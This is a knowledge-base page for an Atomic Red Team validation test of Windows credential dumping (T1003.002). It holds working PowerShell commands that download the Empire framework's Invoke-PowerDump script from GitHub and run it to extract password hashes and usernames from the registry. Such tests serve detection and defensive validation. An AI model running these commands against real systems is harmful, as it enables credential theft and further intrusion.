---
atomic_guid: "804f28fc-68fc-40da-b5a2-e9d0bce5c193"
title: "PowerDump Hashes and Usernames from Registry"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.002"
attack_technique_name: "OS Credential Dumping: Security Account Manager"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "804f28fc-68fc-40da-b5a2-e9d0bce5c193"
  - "PowerDump Hashes and Usernames from Registry"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# PowerDump Hashes and Usernames from Registry

Executes a hashdump by reading the hashes from the registry.

## Metadata

- Atomic GUID: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
- Technique: T1003.002: OS Credential Dumping: Security Account Manager
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1003.002/T1003.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.002]]

## Dependencies

PowerDump script must exist on disk at specified location

### Prerequisite Check

```text
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
Invoke-PowerDump
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml)
